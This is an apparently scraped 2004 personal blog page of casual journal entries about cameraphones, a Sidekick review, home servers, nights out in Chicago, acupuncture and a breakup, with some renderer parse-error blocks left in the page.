href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600%2F040420040229&amp;img=Nokia6600%28160%29.jpg'>morgan</a> were all present - and an assload of morgans friends - who I entertained with yoyo tricks as soon as the <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600%2F040420040229&amp;img=Nokia6600%28178%29.jpg'>police left</a> ;) you have no idea how illegal unsanctioned yoyo tricks are. <br /><br />this is a horrible entry. <br /><br /><a href='http://nata2.info/misc/Incoming/Message%20from%2004_04_04.mp3'>listen to this</a>. it is my friend amjad. he is pretty funny. <br /><br />today I am going to code ALL day<br /> and finish my taxes. <br /><br />i just purchased a bunch of crazy hip hop to accompany me tonight. it shoudl rule.</p>

                <p>The shirt I am wearing to day is far too small. heh. it isn&#8217;t relaly &#8220;far&#8221; too small - just enough wear I feel awkward wearing it. and it is BRIGHT purple. I got it about 6 months ago. and I thought it fit. so I hung it up and then put it on prolly 2 months afte I got it. I then was like &#8220;wtf, did I grow&#8221; - cuz it didn&#8217;t fit at all. heh. so I put it away. and then yesterday I tried it on again and it was &#8220;sorta&#8221; ok. so I wore it today and BAM. it doesn&#8217;t fit. and it is bright. so everyone looks at it. hah. whoops. whatever. <br /><br />twista is good. when I first heard his name, I was sure he was from some sketchy group like ICP or something. but he is really good. I really like the &#8220;like a 24&#8221; song. ;)<br /><br />i just got MMS working on my phone. I am unhappy though cuz it shrinks the picture. so I will have to figure out a better way of doing the photoblog. well maybe not. email works pretty good. or maybe I should do the photolog in mms and then have my gallery based archive be the realsize. it would totally help the bandwidth and load issues when I have taken 1 billion pictures with my phone. haha.</p>

                <p>While i was at home for the holidays i saw my friends Sidekick and he showed me the terminal program on it. at the time i was havinging a hell of a time with my server and was always looking for an SSH client while i was traveling. So when i got back to chicago i started thinking about whether or not a Sidekick would be a good idea. My friend chris got one and i was hooked. it worked well for him and he was able to IM from anywhere. so i decided to go ahead and grab one.</p>

<p>I ordered my Sidekick from some sketchy ecomm site. it came a couple days later. i called and changed my plan from the default plan they give new phone users to the sidekick unlimited data plan. once that was clear i was free to play.</p>
<strong>First impressions:</strong>
<p>The thing that relaly bugged me was that all of the data is decentralized. it is cool - cuz you &#8220;can&#8217;t&#8221; really lose anything. but you are not able to get to your data either. it took me WAY WAY too long to get all my phone numbers and such into the sidekick. i was disappointed that they don&#8217;t have a REAL dekstop client for their website. it woudl be really cool if it integrated into something like palm desktop or whatever. and not through painful importing and exporting. what happedn to SYNCML???</p>

<p>the web browser sucks so bad. seriously. not even worth talkign about. it is shit.</p>

<p>The AIM is incredible. Very easy to learn and well designed. i woudl say that this is the best feature.</p>

<p>The EMAIL client is infuriating. WHY oh WHY didn&#8217;t they just make it a legitimate IMAP/POP client. why did they have to integrate it into their shitty &#8220;service.&#8221; arggh. half of the reason i use smartphones is to integrate with my OWN email service.</p>

<p>They really got the interface right. it is very easy to use. i was able to show people and they picked it up right away. it is also and intuitive device. it justs begs people to use it.</p>
<strong>Second Impressions:</strong>
<p>i don&#8217;t know if i woudl pay a lot of money for it. i think it partially is attractive because of the bling aspect. it is a great companion for a nice cell phone. it is something i would carry in a bag not in my pocket. it is far too big. haha.</p>

                <p>and freaked out a bit. I finally calmed down and found out that it will all be ok. I wasn&#8217;t freaking out about anything in particular. just freaking out. more of a nervous situation than anything. it was pretty weird. it is funny when you create scenerios in your head and they matter SOOO much - yet 15 minutes later you are like.. &#8220;ehh whatever.&#8221; basically I woke up, went home, saw that my servers where blowing up. freaked out. freaked out about other stuff. fixed my servers. took a shower. thought about my freaking out all the way to work. drank pop. had a meeting where I became in charge. suddenly it seemed so insignificant.<br /><br />i must be tired<br /><br />i obviously need to go to sleep early tonight. I tihnk that will be a good plan. I am pretty excited about sleeping. hah. I might even attempt ot leave work a bit early and get a head start on a nap. I haven&#8217;t been napping as I should. whatever. I just need to remember to take care of myself. whatever. taking care of yourself is totally overrated.<br /><br />i finally rebuilt my ipod after destroying it. it suddenly wasn&#8217;t able to figure out what songs were already on the ipod and what songs were not on the ipod. it was super annoying. so all yesterday I only had 2g of mp3s(the travesty). so I rebuilt it and filled it up with all of my favorites. all 7152 of my favorite songs. wtf. ipods are insane. I guess I need a bigger one. haha. it is also pretty insane to think that I have purchased 366 songs from the itunes store. I may have a problem. when this first came out I was like &#8220;awesome, no more money spent at virgin.&#8221; however. I was totally tricked. but yea. my library consists 9559 songs. I am so close to 10000. that is pretty cool. what else is crazy is that I own probably 95% of the songs. that extra 500 songs which I don&#8217;t own are either risdual from the napstar days - or are friends bands.<br /><br />i am nodding off. so sleepy. <br /><br />last night I hung out with morgan and her aunt. it was pretty cool. we ate at harry cary&#8217;s and then went to the signature lounge. hah. it was pretty funny. both of those places are places I only go with people from out of town. morgan&#8217;s aunt works for <a href='http://www.alientechnology.com/'>Alien technology</a>. they make RFID stuff. it is pretty fun stuff it seems. I relaly want to learn more so I can screw with the eycards and become soemone else. I once was able to change the resistance of the card or whaver by slicing a small chunk of it off. the door guy was all &#8220;wtf this isn&#8217;t you.&#8221; and I looked. it wasn&#8217;t me at all. which leads me to believe that you can manipulate those cards with knives and scissors. <br /><br />i am cold<br />i am goign to finish eating my meal I purchased almost 2 hours ago. it is sooo fresh and so clean. <br /><br /><a href='http://www.williamhung.net'>this is funny</a>, but you probably already saw it. if you have - you shoudl check out the songs in the itunes library. rather humorous.<br /><br />i made really good headway on my server/firewall today. I am happy.</p>

                <p>i was complaining about not having a really solid way to upload images from my phone to my server. I was using my <a href='http://nata2.info/?path=code%2Fmms2blog'>MMS to photolog</a> script, which totally worked good. but I needed a way to get ALL of the pictures from my camera to my server without havign to bluetooth them and then ftp them and then move them. so I found <a href='http://www.mylesgrant.com/braindump/older/2004/02/18/php_nokia_image_upload_server_02_release.html'>this php nokia image server</a> , configured it, rewrote a bit of it. and BAM now my pictures upload directly to the <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600'>nata2.info section for my cell phone</a>. RULE. now it is time to go home. maybe later I will integrate it with jhead to tag them for date and such. and maybe use the mysql support to do a real photolog. not the ghetto version I got now. hah. we shall see. <b>;)</b>. <br />cameraphone Ho!</p>

                <p>so I sent my boss notice today that I will be taking friday the 9th of april off. this means that I am officially upgrading my servers in the near future. this increases the stress level and my need to work. <b>;)</b> no more hanging out. haha. well a little hanging out. it won&#8217;t take that much time really. I magically and with great luck configured my other box so upgrading should (<i>**should**</i>) be pretty straight forward. however - no upgrade is easy and straight forward. ;). I just ordered a switch. I am rebuilding my firewall. I am reevaluating whether or not I should leave my old box there as a shell. I am leaning against it. but it woudl be super super nice. heh. but it would also be expensive for a high bandwidth shell. when really. I already have one. so I will probably remove it. but whatever. we shall see. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;i am pretty upset about my brash behavoir this weekend. heh. I wasn&apos;t a good friend really. it is weird. I guess everyone goes through those quick moments where they cross the line and regret what they said. it wasn&apos;t even that bad. or.. well.. the intention wasn&apos;t that bad. the outcome may or may not have been bad. eep. &lt;br /&gt;&lt;br /&gt;well hopefully I will be eating soon. I am hungry. while my server is being reborn and detecting DHCP. I need to acquire some much needed sustenance. </pre></p>

                <p>so this weekend has been nice. on friday my coworkers and myself went to the hard rock cafe bar and met my friend winnie for drinks. she works there and was able to hook us up a bit which offset the billion dollars the drinks normally would have cost. it was a nice place. pretty chilled out - however around 5:30 - it started to get pretty full and crazy. after that I went and picked up some buttons at <a href='http://www.busybeaver.net'>busy beaver</a>. that place is so awesome. after that I went home and relaxed. it was so nice to chill out. morgan arrived and we left for sushi wabi. morgan was wearing this awesome dress. sometimes I really wish I was a woman so I could wear fancy clothes. I get so tired of being a rocker. hah. anyway. at sushi wabi we all hung out. felix showed me this <a href='http://www.nata2.info/pictures/misc/phone_camera/photolog/1080527826-headshaker.mp4'>video he shot of me</a>. it is pretty funny. actually it is really silly. but it was shot with his cell phone. the p900 which puts mine to shame <b>:(</b> heh. however we geeked out and properly played bluetooth. I taught him to bluejack and now the universe is solid. dinner was really fun. it is nice to play around with all those people. they are all so nice. morgan is getting into sushi so that is also fun. she ordered some sashimi last time. it rules. I am such a an of good sushi. I could probably eat a lot of it every day. heh. until of course I got tired of it. in a week. or a couple days. umm. yea. soo&#8230; after sushi wabi I went to crobar with all those cats. crobar, as usual, was insane. we all hung out. matt, hiromi, derek, kari, kayne and julie. it ruled. chris was djing with the virgin tears in vip. and felix had a good set. I got tired and left at about 3. but not before attempting to trick everyone into hanging out. I think I was successful. haha. it ruled. I have no idea whats going on. <b>;)</b>. so then I came home and slept until saturday. <br /><br />satruday night I hung out with laura, matiss and hiromi at lula. it was pretty chilled out. then I went to nicks(accidently) and hung out with nick. telo and greg picked me up and we went to roys party. then we went and saw <a href='http://www.discogs.com/artist/Jeff_Mills'>jeff mills</a> at vision. he is quite good. I got home late and slept until 12. I like to sleep. <br /><br />today we walked to wicker park and got lunch. it was nice. sometimes I am not into eating during the day. it is pretty weird. <br /><br />tonight we are going rezas to get some foood. it is sorta for my birthday. since I didn&#8217;t go last week. I have collected a bunch of friends. it will be nice. I am excited. <br /><br /></p>

<p>i have a couple links to share. first one is this one <a href='http://snopes.com/politics/business/mondex.asp'>about RFID tags and the number of the beast</a>. it is funny. 666. hah. the next is about this <a href=' http://www.angelfire.com/extreme4/kiddofspeed/'>lady who rides her motorcycle through chernobyl</a>. it is pretty insane. mostly the pictures are insane. I don&#8217;t often have a chance to see pictures of desolation without strife. not that chernobyl wasn&#8217;t strife but it wasn&#8217;t the same as a war. but anyway.. the pictures are strangely beautiful. <br /><br />i am thinking about writing a letter. I hate to write thuogh. well hate is an interesting word.. I really don&#8217;t like to write - cuz I have such horrible handwriting. but I may write one anyway. ok. <br /><br />i have got to have a discussion on blogs on here.</p>

                <p>i just hate the fact that I am unable to use MMS. <br /><br />i seriously need to save my money. I am always running out of money. wtf. I guess my fasion lifestyle I established when I was a baller doesn&#8217;t transcend well to the non-baller status I am currently exhibiting. doh! or lack there of. :(<br /><br />i say this rant as I prepare to go out to sushi and a <i>super</i> (hah) club with my friends later. it is going to be really fun. I think that the people who will be in attendence are: chris, claudia, virgin tears guys, hiromi, mark, matt, derek, kari, morgan and myself. it is gunna rule. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;3 clubs with friends. seirously. so much fun. we are supposed to meet at sushi wabi for dinner at around 9. which should be FULL of fun. a bucket.&lt;br/&gt;</pre><br />so things with morgan seem to have cleared up a bit. it is nice. she came over and we just hung out and played games. exactly what I wanted to do. I really like her and it is nice that things have worked out for the better. last weekend was pretty sad - but I think it will make our relationship stronger. and more resilent to nuclear war. I hate nuclear war - however I love nucular war. Love. <br /><br />i need to get a frame so we can mount my <a href='http://ironkungfu.com/wiki/index.php/picture%20frame%20ibook'>ibook friend</a>. however I think I need to reinstall osx before that (mostly cuz I have to put the cdrom back in <b>;)</b>). I am really excited about it. I think it is going to turn out really well. if it looks at all like a picture I will be so happy. one of the things I have to figure out is how to remove all the power saving features from osX. so that the screen doesn&#8217;t blank or anything. also I need to figure out how to control it. I am thinking about useing a <a href='http://www.keyspan.com/products/usb/remote/'>infrared remote</a>. I think that would be awesome. but there is also always bluetooth. one of the funniest things about this project is how I have two audreys sitting in my room doing nothing. just chilling. wtf. haha. they could easily become internet terminals. haha. umm whatever. I wish I coudl get QNX to boot on the ibook. then it woudl be really really easy to create this app. or maybe linux. hmm. I guess I will have to invetigate a bit. <br /><br />morgan has a hair show this weekend. I wonder what her hair will be like on sunday. heh. I LOVE crazy hair cuts. my new one is so awesome. its theme was &#8220;camaro.&#8221; hah. it looks it. I almost have a crew cut with a mullet/rattail. hah. awesome. <br /><br />speaking of camaros. I think I may still be getting one. I keep finding local ones for aroun 1200 and that seems reasonable. I am thinkign that I will sell my car and spend half of that money buying a camaro. then giving <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600&amp;img=Nokia6600%28022%29.jpg'>morgan</a>, <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_6600&amp;img=Nokia6600%28023%29.jpg'>matt</a> and joe free reign to &#8220;fix&#8221; it up. I just hope we don&#8217;t have to add a t-top. that seems like it would be a pain. <br /><br />i made a <a href='http://blogs.nata2.org/lite.php'>lite version</a> of the <a href='http://blogs.nata2.org/'>nata2 blogs</a> page for all yall with pdas, <a href='http://ironkungfu.com/wiki/index.php/sidekick'>sidekicks</a> and cool <a href='http://ironkungfu.com/wiki/index.php/nokia%206600'>cell phones</a>. so yea. I am a fan of divs and css. if only I was a designer and had skillz in the design field. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;bR&gt;&lt;br /&gt;hah. if only I was a speller and had skillz in the spelling field. &lt;br /&gt;&lt;br /&gt;so back to my new phone. I relaly like it. however I think the OS is a bit kludgy. it really annoys me. like startign the camera is not relaly instantaneous. for $400 it shoudl be damn fast. also - the selection of applications is a little ot be desired. &lt;br /&gt;&lt;br /&gt;i wish a mobloging standard would emerge. I should start emailing people around the community. if we all adopted a way of mobloging with these phones - then maybe a good application will emerge and mobloging will be easy and fun. it could be xmlrpc based or whatever. right now I am using email - which works but I feel there HAS to be a better way to do it. &lt;br /&gt;&lt;br /&gt;enough.</pre></p>

                <p>i feel better. even matt said I looked and acted more chilled out. I really feel more chilled out. morgan and I talked and came to a point where we are in the same space/place. I think it will work out. we obviously have to redefine our relationship. and how we work together. but that is totally fine and completely appropriate. I think she said it best with an analogy to the gears in a car. going from 3rd gear to 1st. obviously there are some hiccups but we get to keep driving. hahahah. omg. I can&#8217;t believe I just typed that. must resist urge to modify. haha. <br /><br />this whole situation has put my blog back in to a journal state which is interesting. for a long time it was pretty much link posting and commentary. I haven&#8217;t really posted much super personal stuff. I keep getting asked if it is weird to post shit like this. I think it is totally weird - but it is also super cathartic for me. and I really feel it helps me think. I usually write something then go back and edit it and revise it. and finally I have my thoughts sorted out. so.. I guess I could do it in notepad or something. but I am a blogger. heh. I wonder if I should start swearing in my blogs more. I cuss like a sailor. however I usually keep the blog friendly. heh. I will think about it. ;)<br /><br />tonight was juggling club. before hand I ate at johnnys grill - which is super sketchy at times - this was one of those times. I totally felt a little woozy afterwards and wanted to lay down. but I had to juggle and yoyo a bunch. haha. it ruled. I like hanging out with <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1080101255-Nokia6600(006).jpg'>matiss and mark</a>. then I came home and laid around. watched pirates of the carribean. and screwed around with my fancy ibook picture frame. I separated all the <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1080109043-Nokia6600(010).jpg'>non-essential parts</a> and then put it in an <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1080111718-Nokia6600(014).jpg'>old amazon box</a>. it even <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1080111294-Nokia6600(012).jpg'>booted in the amazon box</a>. I think this project rules. it is a lot of fun working with matt. heh. I think we are going to find a really nice frame and set it in there. I am still incredibly surprised how freaking thin it ended up once I stripped all the non-essential pieces out. the next step is writing an application to do all the things we want our fancy picture frame to do. I think we want it to display pictures we define, display pictures we email it, and display pictures from nata2.info. also there should be a new ticker mode that will display all our blogs and news feeds. possibly stream cspan. hahah. something else maybe. I would like to also incorporate it into some webapp. so that web users can mess with it as well. maybe have a text scroller along the bottom that will last for 10 minutes per message or something. I was thinking of doing it all in flash and php/xml. it will rule. I will of course relase the application and let yall play. <br /><br />now sleep. I gotta 8:30 meeting with my boss in the morning. hopefully it will be good. I don&#8217;t think I could really handle any more strife right now. ;)</p>

                <p>so tonight was really nice. I went to eat with matt, matt, jenny and hiromi at irazu. we just hung out and talked shit. I ended up buyng hiromi&#8217;s old ibook to make a picture frame computer. it should be pretty nice. it is strewn about the living room onw. much to te bemusement of my roommates I imagine. heh. after irazu we came back her and took apart the ibook. it ruled. I also talked a bit to morgan which was nice. it seems that things maybe looking up. we are going to give the whole situation some time to see how it plays out. I relaly miss her. which is good and bad. anyway.. after we talked - chris and brian picked me up and we went to home depot and purchased 30 boxes to help him move. we then went to sushi wabi and had some &#8220;birthday&#8221; sushi with claudia. I relaly like those guys. they were all honestly concerned and supportive. I really enjoy them. after a delightful meal we went to chris&#8217;s house and picked up some stuff. then went to watusi. heh. fun fun. <br /><br />then I went to bed. I will prolly put pictures up shortly.</p>

                <p>i was able to fix my <a href='photolog.php'>photolog</a> in like 3 minutes. it worked out FINE. hah. the pictures from the phone are 640x480 so quite a bit bigger than the previous demensions. however. I think the next step will be hooking GD into the photolog software to create thumbnails. heh. I think it will be worth it. and it will rule. RULE I say. <br /><br />i am able to bypass MMS and use the email client on the phone to send the images. it is annoying. but honestly no harder than the T610. I just wish it was all automagic. maybe I shoudl write an app to solve this problem. <br /><br />i just got a bit sad. <br /><br />i am also test a <a href='http://nata2.org/?mode=div'>version of my blog</a> that uses <a href='http://nata2.org/?mode=div'>div tags</a> rather than full tables. it is a little bit more accessable.

I really don&#8217;t know. sooo good. ok. so I have a bunch of meetings that are really gunna make me mad in about 15 minutes. so I gotta chill out.

                <p>today was kinda rough. morgan and I had a discussion last night that ended with our pretty much breaking up. it sucks quite a bit. I really didn&#8217;t mean for this to happen. and I don&#8217;t really know if she did either. but I am also not sure if it is something that is reconciliable or if it is just a situation that sucks and will not become &#8220;fixed.&#8221; the reasons are all valid, and rational. it seems that it was a timing issue - not anything to do with reality or anything that breakups are usually. it just sucked a lot for it to be on my birthday. like a lot. I have officially postponed my birthday until next sunday. to help with my own sanity. <br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;bR&gt;morgan is coming over now. we are going to talk about all this I imagine. it is pertty hard to deal with. mostly just something that I don&apos;t want to deal with. yea know. not an inconvienience. just something that is not my favorite. in fact it is so far from my favorite that I hate it. &lt;br /&gt;&lt;br /&gt;i went to brunch today with &lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2004%3A03%3A21_birthday%20brunch&quot;&gt;some friends&lt;/a&gt;. it was a lot of fun. I am glad they dragged me out. I needed it so much. it was successful. what wasn&apos;t successful was going to a movie with hiromi. we went and saw &lt;a href=&quot;http://www.rottentomatoes.com/m/EternalSunshineoftheSpotlessMind-1130889/&quot;&gt;Eternal Sunshine of the Spotless Mind&lt;/a&gt; - which I really enjoyed but isn&apos;t the best movie to see while you are all broken up over a girl. hah. what luck. &lt;b&gt;;)&lt;/b&gt;. it ruled nonetheless. well ruled is an interesting description. ok. I am going to lie down. I need to remember to eat. remind me. </pre></p>

                <p>so last night after morgan left I felt pretty good. like. &#8220;ok this will be fine. I understand. it is all good. I look forward to being her friend.&#8221; today. I wake up. it is not easier. it is not fun. I really don&#8217;t want this to be happening. honestly. I am really sad. I don&#8217;t really want to goto work. I don&#8217;t really want to hang out. I look to checking my email in case she sent me one. I am afraid that she will block me on aim. I am afraid. I hate this. it isn&#8217;t easier. even though I understand why - it still doesn&#8217;t make sense. <br /><br />i guess I shoudl engage in normalacy to fight these feelings. but I don&#8217;t really want to fight them. I don&#8217;t want to not be sad. I really like her. as a friend. as a girlfriend. I really don&#8217;t want to act like that isn&#8217;t true. it really is hard for me to act like she doesn&#8217;t mean anything to me for the next week or two. it is incredibly hard. but I know that I can&#8217;t be in her life right now. wtf. that is sad. I guess I haven&#8217;t a choice really. heh. awesome. but how does this work. how does it reconcile itself. how does it come together. I miss her. <br /><br />i also love that one of my only outlets is a blog. haha. stupid public facing internet.</p>

                <p>well morgan and I talked. it was kinda hard. but at the same time. it made things a lot better. closure is always good. <br /><br />i wish it wasn&#8217;t really this way however. but whatever. we will get along well. and it will work out - however it needs to work out.</p>

                <p>so I am going to make a post not on that topic. doh! <br /><br /> so morgan picked me up a copy of the <a href='http://www.economist.com/'>economist</a>. the cover is seriously the <a href='http://www.dopeman.org/threetogo.jpg'>best thing ever</a>. I think I might subscribe. I also want to subscribe to a military journal as well. I don&#8217;t know what. probably something rather conservative. something like <a href='http://www.janes.com/'>janes</a> - but on paper. and then maybe <a href='http://www.motherjones.com/about/index.html'>Mother Jones</a>. oh and <a href='http://harpers.org'>harpers</a> (have you noticed how almost everything named harper <a href='http://harpers.org/MostRecentIndex.html'>rules</a>? I sure have). I really wish that all of this info was available in an embedded news reader in my glasses. I always end up destroying magazines. they are so fragil. heh. <br /><br /><a href='http://www.proxientunit.com'>mike</a> is rightfully <a href='http://www.proxientunit.com/archives/000162.html'>disturbed</a> by <a href='http://www.erotech-industries.com/'>this (nsfw)</a>. weird eh. I love computers. and their friends. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;bR&gt;&lt;br /&gt;i am seriously considering getting a bike. I think it would be fun to ride to work. and I woudl be in much better shape because of it. I am thinking of getting a hybrid - cuz I don&apos;t like skinny skinny tires. and I am thinking about dropping the gears to a bare bare minimum. also something not to expensive. so all you bike riders out there.. let me know what you think. I talked to my friend who lives and works near me. and she said that it wasn&apos;t that big of a deal. you sweat a lot - so you bring your clothes with you. but that it was nice. and terrifying. that is the part I am leery about. but I will get a helmet. it will rule. &lt;br /&gt;&lt;bR&gt;ok I am hungry now. lunch time. </pre></p>

                <p>well. basically I feel right now that when you get down it is pretty easy to look up. I just had a meeting. it was really dumb. I stopped listening months ago. hah. just kidding ;) I stopped listening soemtime in the meeting. and then realized that they were talking about something I needed to listen to . so I attempted to replay what had happaned in my mind. it was hard. however. somehow in the meeting I started thinking. well first it was an awknoledgement that my feeligns will waiver between good and bad. and that I will be sad. whatever whatever. and the second was that. it doesn&#8217;t matter. I am/will be more so friends with morgan. we will still hang out. I still care for her so.. its all good. I guess. hahah. <br /><br /> specifically I think what I forgot - is that I have so much else goign on that I need to remember. I coudl program 20 webapps tonight and forget everything - from eating to being sad. hah. but I guess my point is that I have to think bigger than five minutes. especially bigger than five minutes ago. that is helpful. <br /><br />oh and I am going to be updating <a href='http://3gcoding.com'>3gcoding.com</a> soon. <br /><br /> so.. thanks to all my friends who have been there for me. especially john, my roomies, chris, morgan and jon. yall have really helped me. punks. hah. umm.</p>

                <p>i got my new phone. it is quite something. I am unable to post pictures with it yet.. I don&#8217;t know why. but I imagine soon. I just have to experiment. heh. experiment. yesterday I hleped scott with a surprise party after he closed on his house and asked his girlfriend beth to marry him. weird. it was pretty fun. I had too much sushi and too much alcohol and ended up going to bed around twelve - which ruled. I slept for around 12 hours. I enjoy sleep. <br /><br />for the party I was supposed to receive text messages alerting me of the present situation - so I could react with the party group appropriately. however - I screwed around with my new cell phone soo much that I ran it out of batteries. haha. it ruled. so I left work ten minutes earlier and swapped my sim card in to my old phone. haha. so I didn&#8217;t get to show off my fancy phone amoung fancy people. someday. someday. <br /><br />tomorrow is my birthday. I am excited. I sometimes hate birthdays. because I either always build them up and then are dissapointed or I don&#8217;t build them up and am disappointed. this time I am going to just relax and chill out. hah. for those that know me.. you can guess that relaxing and chilling out is not one of my better qualities.. hahah. anyway. yea. I am excctied however to see how my birthday turns out. I just need to remember not to &#8220;plan&#8221; anything. always just relax. haha. <br /><br /><a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A03%3A19_scotts_party'>here</a> are the pictures from scott and beths party. don&#8217;t worry about the nudity.</p>

                <p>so I went and got accupuncture last night. I think I am done for a bit. I originally went to alleviate some back pain I had gained from wrestling - however the back pain is gone. so wheni arrived yesterday I realized that I really had know ailments for her to manipulate. I was perfect. so the session ended up just being weird and boring I mean.. it isn&#8217;t really suppsoed to be entertaining - but I got tired of it and was suddenly done. this coupled with my unusually high(apparently) pain threshold made for a strangely unpleasent experience. she kept doing these things and asking me if they hurt. heh. none of them ever hurt - however my back is relaly sore today. she warned me of that - but I was like &#8220;yeah yeah yeah.&#8221; whatever. haha. the one thing that was shocking - is that she put a needle into my finger and it totally destroyed my hand in pain. it was madness. total madness. my mind stopping paying attention to reality for a second - enough time to render the pain as a spindly set of wires shooting up my arm. insane. after I exclaimed my concerns over the shooting/stabbing/destroying pain in my hand - she removed the needle and it was gone. score one nerves. score zero acupuncture. <br /><br />one of the weirdest side effects of the acupuncture was the emotion weirdness that happens afterwards. hiromi had mentioned that she is super weird afterwards and I experienced this after the last session. but it is still pretty weird. for the most part I am a relatively levelheaded person. oh sure I am crazy sometimes - but overall I am not a sad person. however both times after my accupuncture I felt really low confidence and totally out of place and time. the accupuncturist women described it as being &#8220;stoned&#8221; - heh. I don&#8217;t know about that but it certain is a bit disconcerting to know that when I come back from the weird &#8221;<a href='http://www.goodlifemagnets.com/acupuncture.gif'>needle massage</a>&#8221; that I am going to be an emotional wreck for the next four hours. <br /><br />heh. so anyway. last night I got back from the crazy with machine and hung out a bit at home. morgan called and then I called back and acted like a crazy person. seriously. I didn&#8217;t make sense - and I wasn&#8217;t able to form sentences. those two may be related. so I just chilled - then went to watusi to hang out and see people and drink beers. after beers we went home. it was a fun night. morgans friend leslie is fun. <br /><br />my <b>birthday</b> is on <a href='http://encyclopedia.thefreedictionary.com/March%2021'>sunday</a>. get me <a href='http://www.amazon.com/gp/registry/registry.html/002-0276114-2914465?%5Fencoding=UTF8&id=24TWA6NT9YXAS'>gifts</a>. <br /><br />today is totally a weird day. I keep nodding off at my desk. not really sleeping - just not existing. well.. ok sleeping. but only for a sec. it is really annoying. and we didn&#8217;t really stay up that late. I mean maybe until 3:30am haha. but not until 5 or 6. ok delerium setting in. wait.. <br /><br />i often laugh at what becomes news worthy in our media. for instance: <a href='http://drudgereport.com/kerryid1.htm'>Kerry unloaded italian mansion month he decided white house run</a>. wtf. why is this important. is it important because he was able to use some of the money to support his candidacy? the article doesn&#8217;t really say - it just doesn&#8217;t really make any sense why this is news worthy. UNLESS!! it is on the case of <a href='http://andrew_redux.blogs.com/redux/2004/02/john_kerry_anti.html'>kerry being a communist</a> and owning overseas property which demonstrates his honest support of <a href='http://www.tradingwebspaces.com/archives/breakroom2.jpg'>bin laden and the al qaeda</a>. I knew it. <br /><br />i think it is disappointing to see the power that <a href='http://www.miami.com/mld/miamiherald/8199068.htm?template=contentModules/printstory.jsp'>jesus still has</a>. man religion is wack. I know so few <a href='http://mattroanwillkickyourass.com/'>cool christians</a> that it makes me sad. I wonder though.. how is &#8220;the passion&#8221; different from chick&#8217;s <a href='http://www.chick.com/catalog/videos/LOTW.asp'>light of the world</a>. both are &#8220;truth.&#8221; both contain interpretations of the <a href='http://www.bible-christian-heritage.co.uk/images/bible.9.jpg'>christian bible</a>(versus the <a href='http://home.online.no/~corneliu/extreme.html'>church of appliantology</a> bible). and both are made by evil men. well I guess the <a href='http://www.hkdvdmart.com/a1/dvdmart/image/chick.jpg'>chick dvd</a> isn&#8217;t really a movie. it is more of a slide show. but really - aren&#8217;t both attempting to stir up some hate against the truth naysayers.. anyway. it is all pretty weird to me. I would vote for jesus if he were running against bush. that is for sure. <br /><a href='http://news.yahoo.com/news?tmpl=story2&cid=519&u=/ap/20040318/ap_on_re_us/college_hate_crime_1&printer=1' />this&lt;/a&gt; is very interesting and not really very surprising. heh. scalia is insane. once I met him at college. we drank wine together and discussed the <a href='http://www.project2061.org/tools/sfaaol/chap1.htm'>nature of science</a> and its <a href='http://www.stanford.edu/dept/HPST/SciMedOrg/presentations/AlliKraus/img013.jpg'>relationship to religion</a> - from a catholic point of view. hah. he didn&#8217;t say &#8221;<a href='http://www.usatoday.com/news/washington/2004-02-06-cheney-scalia_x.htm'>quack</a>&#8221; once. which was too bad. I would have liked to talk duck with him. <br /><br />i wonder how long we can act like <a href='http://www.editorandpublisher.com/eandp/columns/shoptalk_display.jsp?vnu_content_id=1000465506'>this</a> isn&#8217;t a problem. I would guess a long time. we have <a href='http://www.washtimes.com/national/20040317-105827-1441r.htm'>lots</a> of other <a href='http://news.myway.com/top/article/id/256517|top|03-18-2004::10:04|reuters.html'>things</a> to <a href='http://www.eubusiness.com/afp/040318101927.gsn430bz'>think about</a>. <br /><br />oh check out this site I made the other day: <a href='http://www.swampsugar.net'>swampsugar.net</a>. I like it. it looks good. has a good theme and works well in almost all browsers. I didn&#8217;t test netscape 4.7. mostly because I hate netscape 4.7. hate is a strong word - and is appropriately used when refering to the <a href='http://www.hobbytyme.com/mdse/ver1444.jpg'>devil incarnate</a> that is netscape 4.7. <br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

                <p>umm. soo.. yea.. umm.. uhh.. I am like.. uhh.. <br /><br />this weekend was great. we had a fun time. it was wonderful to have jon visit. we hadn&#8217;t really hung out in recent times and we were able to spend some real quality time chillin. it is interestig to see how wwe each our growing up and going our separate ways. this combined with the <a href='http://coollame.org/bushkerry.php'>blog wars</a> is making my rise to adulthood very interesting. I don&#8217;t know if a time has ever occured where I could <a href='http://blogs.nata2.org'>stalk all my friends</a> without them really caring. heh. so anyway.. here are some <a href='http://nata2.info/?path=pictures%2Fevents%2Farthistory_bday_party_04'>pictures from this weekend</a>. it was fun. the best was when jon stole this dude hiromi is dating&#8217;s key chain. an dthen found out it was this dudes so he gave it back. it was awesome. so funny. heh. yea. <br /><br />sometimes I love that our president/government is <a href='http://war.watership.org/link.php?lid=1890'>incompetent</a>. so funny. but not as funny as <a href='http://nata2.info/war/rumsfeld_deny_iraq_threat.wmv'>rumsfeld running for cover</a> - so slimy these people are. <br /><br />i love reading other people chat conversations - especially if they are <a href='http://www.bash.org'>funny</a>. <a href='http://sylloge.typepad.com/questions/'>this</a> gut seems to attract a lot of <a 